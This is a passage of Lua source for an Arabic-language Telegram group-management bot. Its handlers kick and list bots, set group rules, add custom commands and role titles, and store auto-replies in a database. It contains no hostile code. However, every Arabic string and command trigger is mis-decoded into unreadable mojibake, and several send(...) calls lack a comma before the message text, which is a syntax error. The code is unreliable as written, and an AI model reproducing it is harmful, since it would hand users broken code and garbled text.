https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end,nil)
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ' and Manger(msg) then     
database:del(bot_id.."filteranimation"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' *Ω­ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΨͺΨ­Ψ±ΩΨ§Ψͺ*')  
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±' and Manger(msg) then     
database:del(bot_id.."filterphoto"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' *Ω­ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΨ΅ΩΨ±*')  
end
if text == 'ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ' and Manger(msg) then     
database:del(bot_id.."filtersteckr"..msg.chat_id_)
send(msg.chat_id_, msg.id_,' *Ω­ΨͺΩ ΩΨ³Ψ­ ΩΨ§Ψ¦ΩΩ ΩΩΨΉ Ψ§ΩΩΩΨ΅ΩΨ§Ψͺ*')  
end

if text == "Ψ·Ψ±Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ" and Admin(msg) then 
tdcli_function ({ ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) 
local admins = tah.members_ 
local x = 0
local c = 0
for i=0 , #admins do 
if tah.members_[i].status_.ID == "ChatMemberStatusEditor" then 
x = x + 1 
end
if tonumber(admins[i].user_id_) ~= tonumber(bot_id) then
Kick_Group(msg.chat_id_,admins[i].user_id_)
end
c = c + 1
end 
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ¨ΩΨͺΨ§Ψͺ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")
else
local t = "Ω­ ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ ΩΩΨ§ >> {"..c.."}\nΩ­ ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§Ψ―ΩΩ >> {"..x.."}\nΩ­ ΨͺΩ Ψ·Ψ±Ψ― >> {"..(c - x).."} ΩΩ Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ"
send(msg.chat_id_, msg.id_,t) 
end 
end,nil) 
end 
if text == ("ΩΨ΄Ω Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ") and Admin(msg) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(extra,result,success)
local admins = result.members_ 
text = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΩΩΨ¬ΩΨ―Ω \nβ β β β β β β β β \n"
local n = 0
local t = 0
for i=0 , #admins do 
n = (n + 1)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_
},function(arg,ta) 
if result.members_[i].status_.ID == "ChatMemberStatusMember" then 
tr = ""
elseif result.members_[i].status_.ID == "ChatMemberStatusEditor" then 
t = t + 1
tr = "Β {β―}"
end
text = text..">>Β [@"..ta.username_.."]"..tr.."\n"
if #admins == 0 then
send(msg.chat_id_, msg.id_, "Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ¨ΩΨͺΨ§Ψͺ ΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ")
return false 
end
if #admins == i then 
local a = "\nβ β β β β β β β β \nΩ­ ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩΨ§ >> {"..n.."} Ψ¨ΩΨͺ\n"
local f = "Ω­ ΨΉΨ―Ψ― Ψ§ΩΨ¨ΩΨͺΨ§Ψͺ Ψ§ΩΨͺΩ ΩΩ Ψ§Ψ―ΩΩ >> {"..t.."}\nΩ­ ΩΩΨ§Ψ­ΨΆΩ ΨΉΩΨ§ΩΨ© Ψ§Ω (β―) ΨͺΨΉΩΩ Ψ§Ω Ψ§ΩΨ¨ΩΨͺ Ψ§Ψ―ΩΩ \nπ₯"
send(msg.chat_id_, msg.id_, text..a..f)
end
end,nil)
end
end,nil)
end

if database:get(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_) then 
if text == "Ψ§ΩΨΊΨ§Ψ‘" then 
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ­ΩΨΈ Ψ§ΩΩΩΨ§ΩΩΩ") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false 
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ­ΩΨΈ ΩΩΨ§ΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end 

if text == "ΨΆΨΉ ΩΩΨ§ΩΩΩ" or text == "ΩΨΆΨΉ ΩΩΨ§ΩΩΩ" then 
if Admin(msg) then
database:setex(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 600, true) 
send(msg.chat_id_,msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΩΩΨ§ΩΩΩ Ψ§ΩΨ§Ω") 
end
end
if text == "ΩΨ³Ψ­ Ψ§ΩΩΩΨ§ΩΩΩ" or text == "Ψ­Ψ°Ω Ψ§ΩΩΩΨ§ΩΩΩ" then 
if Admin(msg) then
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© ΩΩΨ§ΩΩΩ Ψ§ΩΩΨ¬ΩΩΨΉΩ") 
database:del(bot_id.."Set:Rules:Group"..msg.chat_id_) 
end
end
if text == "Ψ§ΩΩΩΨ§ΩΩΩ" then 
local Set_Rules = database:get(bot_id.."Set:Rules:Group" .. msg.chat_id_) 
if Set_Rules then 
send(msg.chat_id_,msg.id_, Set_Rules) 
else 
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― ΩΩΨ§ΩΩΩ ΩΩΨ§") 
end 
end

if text == "Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" and Creator(msg) then
local list = database:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_.."")
t = "Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ \nβ β β β β β β β β \n"
for k,v in pairs(list) do
Cmds = database:get(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
if Cmds then 
t = t..""..k.."- ("..v..") ~ {"..Cmds.."}\n"
else
t = t..""..k.."- ("..v..") \n"
end
end
if #list == 0 then
t = "Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ§ΩΨ§ΩΨ± Ψ§ΨΆΨ§ΩΩΩ"
end
send(msg.chat_id_, msg.id_,"["..t.."]")
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" or text == "ΩΨ³Ψ­ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΩΨΆΨ§ΩΩ" then
if Creator(msg) then 
local list = database:smembers(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Set:Cmd:Group:New1"..msg.chat_id_..":"..v)
database:del(bot_id.."List:Cmd:Group:New"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ¬ΩΩΨΉ Ψ§ΩΨ§ΩΨ§ΩΨ± Ψ§ΩΨͺΩ ΨͺΩ Ψ§ΨΆΨ§ΩΨͺΩΨ§") 
end
end
if text == "Ψ§ΨΆΩ Ψ§ΩΨ±" and Creator(msg) then
database:set(bot_id.."Set:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω ΩΩ Ψ§ΩΨ§ΩΨ± Ψ§ΩΩΨ―ΩΩ ..") 
return false
end
if text == "Ψ­Ψ°Ω Ψ§ΩΨ±" or text == "ΩΨ³Ψ­ Ψ§ΩΨ±" then 
if Creator(msg) then
database:set(bot_id.."Del:Cmd:Group"..msg.chat_id_..":"..msg.sender_user_id_,"true") 
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΨ§ΩΨ± Ψ§ΩΨ°Ω ΩΩ Ψ¨ΩΨΆΨΉΩ Ψ¨Ψ―ΩΨ§ ΨΉΩ Ψ§ΩΩΨ―ΩΩ") 
return false
end
end

if text == "Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" and Admin(msg) then 
local list = database:smembers(bot_id.."Coomds"..msg.chat_id_)
if #list == 0 then
send(msg.chat_id_, msg.id_,"Ω­ ΩΨ§ ΨͺΩΨ¬Ψ― Ψ΅ΩΨ§Ψ­ΩΨ§Ψͺ ΩΨΆΨ§ΩΩ")
return false
end
t = "\nΩ­ ΩΨ§Ψ¦ΩΨ© Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ Ψ§ΩΩΨΆΨ§ΩΩ \nβββββββββββββ\n"
for k,v in pairs(list) do
var = database:get(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
if var then
t = t..""..k.."- "..v.." ~ ("..var..")\n"
else
t = t..""..k.."- "..v.."\n"
end
end
send(msg.chat_id_, msg.id_,t)
end
if text == "ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ" then
local list = database:smembers(bot_id.."Coomds"..msg.chat_id_)
for k,v in pairs(list) do
database:del(bot_id.."Comd:New:rt:bot:"..v..msg.chat_id_)
database:del(bot_id.."Coomds"..msg.chat_id_)
end
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΨ§Ψͺ")
end
if text and text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Admin(msg) then 
ComdNew = text:match("^Ψ§ΨΆΩ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
database:set(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_,ComdNew) 
database:sadd(bot_id.."Coomds"..msg.chat_id_,ComdNew) 
database:setex(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_,200,true) 
send(msg.chat_id_, msg.id_, "Ω­ Ψ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ \nΩ­ (ΨΉΨΆΩ ~ ΩΩΩΨ² ~ Ψ§Ψ―ΩΩ ~ ΩΨ―ΩΨ± )") 
end
if text and text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Admin(msg) or text and text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") and Admin(msg) then 
ComdNew = text:match("^ΩΨ³Ψ­ Ψ΅ΩΨ§Ψ­ΩΩ (.*)$") or text:match("^Ψ­Ψ°Ω Ψ΅ΩΨ§Ψ­ΩΩ (.*)$")
database:del(bot_id.."Comd:New:rt:bot:"..ComdNew..msg.chat_id_)
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ") 
end
if database:get(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) then 
if text and text:match("^Ψ§ΩΨΊΨ§Ψ‘$") then 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ Ψ§ΩΨΊΨ§Ψ‘ Ψ§ΩΨ§ΩΨ± ") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end 
if text == "ΩΨ―ΩΨ±" then
if not Creator(msg) then
send(msg.chat_id_, msg.id_"Ω­ Ψ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nΩ­ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ (ΨΉΨΆΩ ~ ΩΩΩΨ² ~ Ψ§Ψ―ΩΩ )") 
return false
end
end
if text == "Ψ§Ψ―ΩΩ" then
if not Manger(msg) then 
send(msg.chat_id_, msg.id_"Ω­ Ψ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nΩ­ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ ( ΨΉΨΆΩ ~ ΩΩΩΨ² )") 
return false
end
end
if text == "ΩΩΩΨ²" then
if not Admin(msg) then
send(msg.chat_id_, msg.id_"Ω­ Ψ§Ψ±Ψ³Ω ΩΩΨΉ Ψ§ΩΨ΅ΩΨ§Ψ­ΩΩ ΩΨ±Ω Ψ§Ψ?Ψ±\nΩ­ ΨͺΨ³ΨͺΨ·ΩΨΉ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΩ ( ΨΉΨΆΩ )") 
return false
end
end
if text == "ΩΨ―ΩΨ±" or text == "Ψ§Ψ―ΩΩ" or text == "ΩΩΩΨ²" or text == "ΨΉΨΆΩ" then
local textn = database:get(bot_id.."Comd:New:rt"..msg.chat_id_..msg.sender_user_id_) 
database:set(bot_id.."Comd:New:rt:bot:"..textn..msg.chat_id_,text)
send(msg.chat_id_, msg.id_, "Ω­ ΨͺΩ Ψ§ΨΆΨ§ΩΨ© Ψ΅ΩΨ§Ψ­ΩΨ© ") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false 
end 
end

if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± (.*)$") 
database:set(bot_id.."Sudo:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ·ΩΨ± Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω (.*)$") 
database:set(bot_id.."SupCreator:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΨ§Ψ³Ψ§Ψ³Ω Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ (.*)$") 
database:set(bot_id.."Creator:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΨ΄Ψ¦ Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± (.*)$") 
database:set(bot_id.."Manager:Rd"..msg.chat_id_,Teext) 
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΨ―ΩΨ± Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ (.*)$") 
database:set(bot_id.."Mod:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨ§Ψ―ΩΩ Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² (.*)$") 
database:set(bot_id.."Special:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΩΩΩΨ² Ψ§ΩΩ Β» "..Teext)
end
if text and text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ (.*)$") and Manger(msg) then
local Teext = text:match("^ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ (.*)$") 
database:set(bot_id.."Memp:Rd"..msg.chat_id_,Teext)
send(msg.chat_id_, msg.id_,"Ω­ ΨͺΩ ΨͺΨΊΩΨ± Ψ±Ψ― Ψ§ΩΨΉΨΆΩ Ψ§ΩΩ Β» "..Teext)
end


if text == ("ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ―") and SupCreator(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
for k,v in pairs(list) do
database:del(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) 
database:del(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_)
database:del(bot_id..'List:Manager'..msg.chat_id_)
end
send(msg.chat_id_, msg.id_," Ω­ ΨͺΩ ΩΨ³Ψ­ Ψ§ΩΨ±Ψ―ΩΨ―")
end
if text == ("Ψ§ΩΨ±Ψ―ΩΨ―") and Manger(msg) then
local list = database:smembers(bot_id..'List:Manager'..msg.chat_id_..'')
text = " Ω­ ΩΨ§Ψ¦ΩΩ Ψ§ΩΨ±Ψ―ΩΨ― Ψ§ΩΩΨΆΨ§ΩΩ \nβ’ββββ revor ββββββ’\n"
for k,v in pairs(list) do
if database:get(bot_id.."Add:Rd:Manager:Gif"..v..msg.chat_id_) then
db = 'ΩΨͺΨ­Ψ±ΩΩ'
elseif database:get(bot_id.."Add:Rd:Manager:Vico"..v..msg.chat_id_) then
db = 'Ψ¨Ψ΅ΩΩ'
elseif database:get(bot_id.."Add:Rd:Manager:Stekrs"..v..msg.chat_id_) then
db = 'ΩΩΨ΅Ω'
elseif database:get(bot_id.."Add:Rd:Manager:Text"..v..msg.chat_id_) then
db = 'Ψ±Ψ³Ψ§ΩΩ'
elseif database:get(bot_id.."Add:Rd:Manager:Photo"..v..msg.chat_id_) then
db = 'Ψ΅ΩΨ±Ω'
elseif database:get(bot_id.."Add:Rd:Manager:Video"..v..msg.chat_id_) then
db = 'ΩΩΨ―ΩΩ'
elseif database:get(bot_id.."Add:Rd:Manager:File"..v..msg.chat_id_) then
db = 'ΩΩΩ'
elseif database:get(bot_id.."Add:Rd:Manager:Audio"..v..msg.chat_id_) then
db = 'Ψ§ΨΊΩΩΩ'
end
text = text..""..k..">> ("..v..") Β» {"..db.."}\n"
end
if #list == 0 then
text = "Ω­ΩΨ§ ΩΩΨ¬Ψ― Ψ±Ψ―ΩΨ―"
end
send(msg.chat_id_, msg.id_,'['..text..']')
end
if text or msg.content_.sticker_ or msg.content_.voice_ or msg.content_.animation_ or msg.content_.audio_ or msg.content_.document_ or msg.content_.photo_ or msg.content_.video_ then  
local test = database:get(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_..'')
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true1' then
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
if msg.content_.sticker_ then   
database:set(bot_id.."Add:Rd:Manager:Stekrs"..test..msg.chat_id_, msg.content_.sticker_.sticker_.persistent_id_)  
end   
if msg.content_.voice_ then  
database:set(bot_id.."Add:Rd:Manager:Vico"..test..msg.chat_id_, msg.content_.voice_.voice_.persistent_id_)  
end   
if msg.content_.animation_ then   
database:set(bot_id.."Add:Rd:Manager:Gif"..test..msg.chat_id_, msg.content_.animation_.animation_.persistent_id_)  
end  
if text then   
text = text:gsub('"','') 
text = text:gsub("'",'') 
text = text:gsub('`','') 
text = text:gsub('*','') 
database:set(bot_id.."Add:Rd:Manager:Text"..test..msg.chat_id_, text)  
end  
if msg.content_.audio_ then
database:set(bot_id.."Add:Rd:Manager:Audio"..test..msg.chat_id_, msg.content_.audio_.audio_.persistent_id_)  
end
if msg.content_.document_ then
database:set(bot_id.."Add:Rd:Manager:File"..test..msg.chat_id_, msg.content_.document_.document_.persistent_id_)  
end
if msg.content_.video_ then
database:set(bot_id.."Add:Rd:Manager:Video"..test..msg.chat_id_, msg.content_.video_.video_.persistent_id_)  
end
if msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo_in_group = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
photo_in_group = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
photo_in_group = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
photo_in_group = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
database:set(bot_id.."Add:Rd:Manager:Photo"..test..msg.chat_id_, photo_in_group)  
end
send(msg.chat_id_, msg.id_,' *Ω­ΨͺΩ Ψ­ΩΨΈ Ψ§ΩΨ±Ψ―*')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'*Ω­Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ* \n*Ω­ΩΨ― ΩΩΩΩ (ΩΩΩ - ΩΨ―ΩΩ - ΩΨ΅ - ΩΩΨ΅Ω - Ψ¨Ψ΅ΩΩ - ΩΨͺΨ­Ψ±ΩΩ )*\n*Ω­ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :*\nΩ­`#username` > ΩΨΉΨ±Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#stast` > Ψ±ΨͺΨ¨Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \nΩ­`#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ')
database:set(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_,'true1')
database:set(bot_id..'Text:Manager'..msg.sender_user_id_..':'..msg.chat_id_, text)
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_) 
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:sadd(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_..'') == 'true2' then
send(msg.chat_id_, msg.id_,' Ω­ ΨͺΩ Ψ§Ψ²Ψ§ΩΨ© Ψ§ΩΨ±Ψ― ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_) 
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Photo"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Video"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:File"..text..msg.chat_id_)
database:del(bot_id.."Add:Rd:Manager:Audio"..text..msg.chat_id_)
database:del(bot_id..'Set:Manager:rd'..msg.sender_user_id_..':'..msg.chat_id_)
database:srem(bot_id..'List:Manager'..msg.chat_id_..'', text)
return false
end
end
if text == "Ψ§ΨΆΩ Ψ±Ψ―" and Manger(msg) then   
send(msg.chat_id_, msg.id_, 'Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΩΨͺΩ ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩΨ§')
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
return false 
end
if text == "Ψ­Ψ°Ω Ψ±Ψ―" and Manger(msg) then   
send(msg.chat_id_, msg.id_,"Ω­ Ψ§Ψ±Ψ³Ω Ψ§ΩΩΩΩΩ Ψ§ΩΨͺΩ ΨͺΨ±ΩΨ― Ψ­Ψ°ΩΩΨ§")
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true2")
return false 
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '*Ω­Ψ§ΩΨ§Ω Ψ§Ψ±Ψ³Ω Ψ§ΩΨ±Ψ― Ψ§ΩΨ°Ω ΨͺΨ±ΩΨ― Ψ§ΨΆΨ§ΩΨͺΩ* \n*Ω­ΩΨ― ΩΩΩΩ (ΩΩΩ - ΩΨ―ΩΩ - ΩΨ΅ - ΩΩΨ΅Ω - Ψ¨Ψ΅ΩΩ - ΩΨͺΨ­Ψ±ΩΩ )*\n*Ω­ΩΩΩΩΩ Ψ§ΨΆΨ§ΩΩ Ψ§ΩΩ Ψ§ΩΩΨ΅ :*\nΩ­`#username` > ΩΨΉΨ±Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#msgs` > ΨΉΨ―Ψ― Ψ±Ψ³Ψ§Ψ¦Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#name` > Ψ§Ψ³Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#id` > Ψ§ΩΨ―Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω\nΩ­`#stast` > Ψ±ΨͺΨ¨Ω Ψ§ΩΩΨ³ΨͺΨ?Ψ―Ω \nΩ­`#edit` > ΨΉΨ―Ψ― Ψ§ΩΨͺΨΉΨ―ΩΩΨ§Ψͺ ')
database:set(bot_id.."Set:Manager:rd"..msg.sender_user_id_..":"..msg.chat_id_,"true1")
